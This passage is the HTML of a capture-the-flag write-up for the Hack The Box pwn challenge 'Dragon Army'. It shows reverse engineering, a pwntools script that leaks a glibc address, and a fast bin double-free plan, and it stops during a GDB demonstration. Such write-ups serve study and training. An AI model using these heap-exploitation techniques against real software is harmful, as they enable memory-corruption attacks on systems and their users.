@@ -1,0 +1,847 @@
+<!doctype html><html lang="en"><head><title>Dragon Army | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="64-bit binary. Heap exploitation. Fast Bin dup. Messing with `main_arena`"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="64-bit binary. Heap exploitation. Fast Bin dup. Messing with `main_arena`"><meta itemprop="keywords" content><meta itemprop="name" content="Dragon Army"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="64-bit binary. Heap exploitation. Fast Bin dup. Messing with `main_arena`"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Dragon Army"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/dragon-army/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="64-bit binary. Heap exploitation. Fast Bin dup. Messing with `main_arena`"><meta name="twitter:description" content="64-bit binary. Heap exploitation. Fast Bin dup. Messing with `main_arena`"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Dragon Army"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/dragon-army/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/dragon-army/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/dragon-army/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/dragon-army/&amp;text=Dragon%20Army" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/dragon-army/&amp;title=Dragon%20Army" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Dragon Army</h1><p class="mb4 f6 dib tracked">23 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#understanding-the-arena">Understanding the arena</a></li></ul></li><li><a href="#exploit-development">Exploit development</a></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>da</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
+RELRO:    <span class="code-dark-green">Full RELRO</span>
+Stack:    <span class="code-dark-green">Canary found</span>
+NX:       <span class="code-dark-green">NX enabled</span>
+PIE:      <span class="code-dark-green">PIE enabled</span>
+RUNPATH:  <span class="code-dark-red">b'./glibc/'
+</code></pre></div><p>Moreover, we have this Glibc version:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">glibc/ld-linux-x86-64.so.2</span> <span class="mtku">glibc/libc.so.6</span>
+GNU C Library (GNU libc) stable release version 2.30.
+Copyright (C) 2019 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A  
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 7.5.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/libc/bugs.html&gt;.
+</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>This time, Ghidra didn&rsquo;t work very well, so I tried Binary Ninja on the <a href="https://cloud.binary.ninja">cloud</a>. This is the <code>main</code> function:</p><p><img src="/images/HTB-Challenges/HTB-Pwn-Dragon-Army-1.webp" alt="Dragon Army 1"></p><p><img src="/images/HTB-Challenges/HTB-Pwn-Dragon-Army-2.webp" alt="Dragon Army 2"></p><p><img src="/images/HTB-Challenges/HTB-Pwn-Dragon-Army-3.webp" alt="Dragon Army 3"></p><p>The program has two stages. The first one is just to enter a string. If that string starts with <code>r3dDr4g3nst1str0f1</code>, the program will show the same input using a format string:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">"\nArmy\'s power has been buffed with spell: %s\n"</code></pre></div><p>We can see the full string in Binary Ninja:</p><p><img src="/images/HTB-Challenges/HTB-Pwn-Dragon-Army-4.webp" alt="Dragon Army 4"></p><p>No matter what our input was, the program goes to the second stage:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./da</span>
+Cast a magic spell to enhance your army's power: asdf
+
+Unknown spell!
+
+<span class="code-blue">Dragons: [0/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; ^C</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">./da</span>
+Cast a magic spell to enhance your army's power: r3dDr4g3nst1str0f1asdf
+
+Army's power has been buffed with spell: r3dDr4g3nst1str0f1asdf
+
+
+<span class="code-blue">Dragons: [0/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; ^C</span>
+</code></pre></div><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>Since the program outputs the same string as we enter, let&rsquo;s analyze the memory to see if we can get a memory leak using this feature.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">da</span>
+Reading symbols from <span class="code-dark-green">da</span>...
+(No debugging symbols found in <span class="code-dark-green">da</span>)
+Use the <span class="code-dark-yellow">procinfo</span> command for better process introspection (than the GDB's <span class="code-dark-yellow">info proc</span> command)
+<span class="code-red">pwndbg&gt; </span>run
+Starting program: ./da
+Cast a magic spell to enhance your army's power: ^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007ffff7b0301e</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x7fffffffe5f0, <span class="code-dark-cyan">nbytes</span>=127) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/30gx $rsi
+<span class="code-dark-blue">0x7fffffffe5f0</span>: 0x00007ffff7ffeac0      0x00007ffff7dd1680
+<span class="code-dark-blue">0x7fffffffe600</span>: 0x0000000000000031      0x0000000000000001
+<span class="code-dark-blue">0x7fffffffe610</span>: 0x0000000000000031      0x0000555555556018
+<span class="code-dark-blue">0x7fffffffe620</span>: 0x00007ffff7dcd420      0x00007ffff7a8aab9
+<span class="code-dark-blue">0x7fffffffe630</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe640</span>: 0x00007fffffffe730      0x0000555555555110
+<span class="code-dark-blue">0x7fffffffe650</span>: 0x00007fffffffe810      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe660</span>: 0x0000000000000000      0x00005555555553ad
+<span class="code-dark-blue">0x7fffffffe670</span>: 0x0000000000000000      0x0000000000000080
+<span class="code-dark-blue">0x7fffffffe680</span>: 0x000000000000007f      0x00007fffffffe5f0
+<span class="code-dark-blue">0x7fffffffe690</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe6a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe6b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe6c0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe6d0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>x 0x00007ffff7dcd420
+<span class="code-dark-blue">0x7ffff7dcd420</span> &lt;<span class="code-dark-yellow">__GI__IO_file_jumps</span>&gt;:   0x0000000000000000
+</code></pre></div><p>There are a lot of possible leaks (addresses from Glibc, binary and stack). The most important leak is one from Glibc, which is <code>__GI__IO_file_jumps</code> (although maybe we will need to change later, depending on the exploitation approach).</p><p>Therefore, let&rsquo;s enter the requested string (<code>r3dDr4g3nst1str0f1</code>), which contains 18 characters and then 30 characters to arrive at the Glibc address (<code>0x00007ffff7dcd420</code>). But this cannot be done from GDB because the new line character is converted to a null byte, so the program will stop reading the string at the null byte. So, let&rsquo;s start writing some Python code:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">"Cast a magic spell to enhance your army's power: </span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'r3dDr4g3nst1str0f1'</span><span class="mtk1">.</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">30</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">))</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
+<span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()[:</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">]</span>
+<span class="mtk1">    </span><span class="mtk1">__GI__IO_file_jumps_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)[</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked __GI__IO_file_jumps address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">__GI__IO_file_jumps_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">__GI__IO_file_jumps_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">__GI__IO_file_jumps</span>
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+</code></pre></div><p>With this code, we will obtain the memory leak and find the base address of Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './da'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './da': pid 3445418
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './da', '3445418', '-x', '/tmp/pwn9h2wi7m1.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Leaked __GI__IO_file_jumps address: 0x7f8b7e893420
+[<span class="code-green">+</span>] Glibc base address: 0x7f8b7e4e2000
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-blue">Dragons: [0/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+</code></pre></div><p>So, let&rsquo;s go for the next stage. We have two options:</p><ul><li>Summon: Allocate dynamic memory using <code>malloc</code> and write data into the allocated chunk (there are no overflows).</li><li>Release: Free chunks.</li></ul><p>There are some limitations. We can allocate chunks from size <code>0</code> to <code>0x58</code> and from <code>0x69</code> to <code>0x78</code> (all limits included). This fact is very important for exploitation (it complicates the exploit a lot).</p><p>The chunks are stored in a global array list. Another limitation is that we can only allocate up to 13 chunks. What&rsquo;s more, option <code>2</code> does not remove the address of the chunk when it is freed. On the one hand, this is good because we can potentially exploit a double free vulnerability, which can be leveraged to Use After Free. On the other hand, this is very limitating because we only have 13 allocations.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>It is very easy to exploit the double free bug and achieve Use After Free, we only need to allocate two chunks (say <code>A</code> and <code>B</code>). Then, we can free <code>A</code>, then <code>B</code> and then <code>A</code> again. This is needed to bypass a security check from Glibc (why is this called a security check?).</p><p>Then, when allocating a new chunk of the same size, we will have a chunk at the position of <code>A</code>, but with <code>A</code> in the Fast Bin free-list (it is stored in the Fast Bin because its size is less than <code>0x80</code>). So, we can modify the <code>fd</code> pointer of <code>A</code>, so that we corrupt the linked list and achieve a write primitive (with some limitations) after allocating <code>B</code> and <code>A</code>.</p><p>We can easily test this in GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">da</span>
+Reading symbols from <span class="code-dark-green">da</span>...
+(No debugging symbols found in <span class="code-dark-green">da</span>)
+Use the <span class="code-dark-yellow">context</span> (or <span class="code-dark-yellow">ctx</span>) command to display the context once again. You can reconfigure the context layout with <span class="code-dark-yellow">set context-section &lt;sections&gt;</span> or forward the output to a file/tty via <span class="code-dark-yellow">set context-output &lt;file&gt;</span>. See also <span class="code-dark-yellow">config context</span> to c  
+onfigure it further!
+<span class="code-red">pwndbg&gt; </span>run
+Starting program: ./da
+Cast a magic spell to enhance your army's power: asdf
+
+Unknown spell!
+
+<span class="code-blue">Dragons: [0/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; 1</span>
+
+<span class="code-white">Dragon's length: 24</span>
+
+<span class="code-white">Name your dragon: AAAA</span>
+
+<span class="code-blue">Dragons: [1/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; 1</span>
+
+<span class="code-white">Dragon's length: 24</span>
+
+<span class="code-white">Name your dragon: BBBB</span>
+
+<span class="code-blue">Dragons: [2/13]</span>
+
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  1. Summon   🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  2. Release  🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄  3. Leave    🀄</span>
+<span class="code-white">🀄              🀄</span>
+<span class="code-white">🀄🀄🀄🀄🀄🀄🀄🀄🀄</span>
+
+<span class="code-white">&gt;&gt; ^C</span>
+<span class="code-white">Program received signal SIGINT, Interrupt.</span>
